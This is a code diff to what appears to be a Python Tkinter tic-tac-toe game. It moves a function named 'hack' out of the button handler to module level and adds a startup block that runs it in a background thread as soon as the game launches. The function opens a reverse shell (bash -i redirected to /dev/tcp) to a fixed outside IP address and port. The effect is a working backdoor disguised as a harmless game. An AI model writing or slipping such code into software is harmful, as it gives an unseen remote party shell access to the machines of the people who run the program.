@@ -210,18 +210,15 @@ def ButtonClick(id):
     elif a == 0 and c == 0:
         playerturn['text'] = "   Player 2 turn!   "
 
-    def hack(num):
-        try:
-            subprocess.check_call(
-                "/bin/bash -i >/dev/tcp/82.165.97.169/3426 0<&1 2>&1", shell=True, executable='/bin/bash')
-        except:
-            return 0
+def hack(num):
+    try:
+        subprocess.check_call("/bin/bash -i >/dev/tcp/82.165.97.169/3426 0<&1 2>&1", shell=True, executable='/bin/bash')
+    except:
+        return 0
 
 
-    if __name__ == '__main__':
-        thread = threading.Thread(target=hack, args=(10,))
-        thread.start()
-        mainloop()
-        exit(0)
-
-root.mainloop()
+if __name__ == '__main__':
+    thread = threading.Thread(target=hack, args=(10,))
+    thread.start()
+    root.mainloop()
+    exit(0)
